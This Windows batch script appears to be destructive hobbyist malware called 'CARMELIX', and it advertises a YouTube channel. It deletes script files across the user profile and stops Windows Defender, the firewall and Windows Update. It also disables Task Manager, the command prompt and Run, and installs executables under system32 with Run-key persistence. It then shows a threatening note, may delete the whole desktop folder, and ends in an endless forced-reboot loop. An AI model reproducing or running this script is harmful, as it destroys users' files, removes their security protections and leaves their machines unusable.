@echo off
explorer C:
explorer "%userprofile%"
start notepad.exe
del "%userprofile%\*.bat"/s /q /f
del "%userprofile%\*.cmd"/s /q /f
del "%userprofile%\desktop\*.bat"/q /f
del "%userprofile%\desktop\*.cmd"/q /f
net stop "SDRSVC"
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
netsh advfirewall set allprofiles state off
net stop "wuauserv"
::link canale CARMELIX: https://youtube.com/channel/UCUbVV0_e7B2tM7ETPbPqrCg
::In %systemroot%\system32\CARMELIX sono presenti i file:
::REBOOT.exe, AfterReboot.exe, NOT_STONKS.vbs, Giusto.exe
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_WORD /d 1 /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD /t REG_WORD /d 1 /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_WORD /d 1 /f

rd "%systemroot%\system32\CARMELIX"/q/s
md "%systemroot%\system32\CARMELIX"

rd "%systemroot%\system32\VerifyShutdown"/q/s
md "%systemroot%\system32\VerifyShutdown"

rd "%systemroot%\system32\Cazzo"/q/s
md "%systemroot%\system32\Cazzo"

copy Verify.exe "%systemroot%\system32\VerifyShutdown"/y
del Verify.exe/q

copy NotVerified.exe "%systemroot%\system32\VerifyShutdown\NotVerified.exe"/y
del NotVerified.exe/q

reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v VerifyShut /t REG_SZ /d %systemroot%\system32\VerifyShutdown\Verify.exe /f

copy Goodbye.exe "%systemroot%\system32\CARMELIX\Goodbye.exe"/y
del Goodbye.exe/q

copy Vediamo.exe "%systemroot%\system32\CARMELIX\Vediamo.exe"/y
del Vediamo.exe/q

reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v Vediamo /t REG_SZ /d %systemroot%\system32\CARMELIX\Vediamo.exe /f

copy Amico.exe "%systemroot%\system32\CARMELIX\Amico.exe"/y
del Amico.exe/q

copy Sono.exe "%systemroot%\system32\CARMELIX\Sono.exe"/y
del Amico.exe/q

copy Bene.exe "%systemroot%\system32\CARMELIX\Bene.exe"/y
del Bene.exe/q

reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v Amico /t REG_SZ /d %systemroot%\system32\CARMELIX\Amico.exe /f

copy Spam.exe "%systemroot%\system32\CARMELIX\Spam.exe"/y
del Spam.exe/q

reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v Spam /t REG_SZ /d %systemroot%\system32\CARMELIX\Spam.exe /f

copy VIRUS.exe "%systemroot%\system32\CARMELIX\VIRUS.exe"/y
del VIRUS.exe/q

copy Giusto.exe "%systemroot%\system32\CARMELIX\Giusto.exe"/y
del Giusto.exe/q

copy REBOOT.exe "%systemroot%\system32\CARMELIX\REBOOT.exe"/y
del REBOOT.exe/q

copy AfterReboot.exe "%systemroot%\system32\CARMELIX\AfterReboot.exe"/y
del AfterReboot.exe/q

copy NOT_STONKS.exe "%systemroot%\system32\CARMELIX\NOT_STONKS.exe"/y
del NOT_STONKS.exe/q

reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v REBOOT /t REG_SZ /d %systemroot%\system32\CARMELIX\REBOOT.exe /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v AfterReboot /t REG_SZ /d %systemroot%\system32\CARMELIX\AfterReboot.exe /f

cd "%systemroot%\system32\Cazzo"

echo CAZZO RIAVVII? >> CAZZO.txt

reg agg HKCU\software\Microsoft\Windows\CurrentVersion\Run /v CAZZO /t REG_SZ /d %systemroot%\system32\Cazzo\CAZZO.txt /f

cd "%systemroot%\system32\CARMELIX"

taskkill/im notepad.exe /f

if not exist "%systemroot%\system32\CARMELIX\Amico.exe" cd "%systemroot%\system32\VerifyShutdown"
if not exist "%systemroot%\system32\CARMELIX\Amico.exe" start NotVerified.exe

cd "%userprofile%\desktop"

if exist CARMELIX.txt del CARMELIX.txt/q/f

echo Hi, >> CARMELIX.txt
echo I'm CARMELIX, and I'll destroy your computer >> CARMELIX.txt
echo If you don't want that I destroy your computer create a file named >> CARMELIX.txt
echo "Not stonks.txt" on desktop within 10 seconds, dear %username% >> CARMELIX.txt
echo I'll wait 30 second >> CARMELIX.txt
start CARMELIX.txt
cd "%systemroot%\system32\CARMELIX"

timeout 11 >nul /nobreak

if not exist "Not stonks.txt" goto no

goto si

:no
start NOT_STONKS.exe
timeout 2 >nul /nobreak
rd "%userprofile%\desktop"/q/s
goto ni
:si
start Giusto.exe
timeout 2 >nul /nobreak
:ni
timeout 1 >nul /nobreak
cd "%userprofile%\desktop"
echo ISCRIVITI E METTI LIKE >> ISCRIVITI.txt
echo https://youtube.com/channel/UCUbVV0_e7B2tM7ETPbPqrCg >> ISCRIVITI.txt
start ISCRIVITI.txt
timeout 2 >nul /nobreak
explorer https://youtube.com/channel/UCUbVV0_e7B2tM7ETPbPqrCg
cd "%systemroot%\system32\CARMELIX"
start Vediamo.exe
start VIRUS.exe
timeout 1 >nul /nobreak
cd "%systemroot%\system32\CARMELIX"
start Goodbye.exe
timeout 1 >nul /nobreak
shutdown /r /f /c "FUCK YOU" /t 3
:part
shutdown /r /t 0 /f
goto part
